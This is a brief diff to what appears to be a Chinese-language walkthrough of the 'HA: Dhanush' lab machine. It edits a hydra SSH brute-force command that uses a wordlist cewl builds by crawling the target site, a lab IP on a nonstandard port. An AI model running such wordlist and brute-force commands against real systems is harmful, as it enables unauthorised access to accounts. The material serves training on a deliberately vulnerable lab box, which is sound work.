@@ -30,7 +30,7 @@ dirb http://192.168.253.141/
 
 ```
 cewl http://192.168.253.141/ -w 1.txt		# 爬取网站生成字典
-hydra -L 1.txt -P 1.txt  -vV -e ns 192.168.253.141 ssh -s 65345
+hydra -L 1.txt -P 1.txt  -vV -e nsr 192.168.253.141 ssh -s 65345 -f
 ```
 
 ![](./img/HA：Dhanush-03.png)
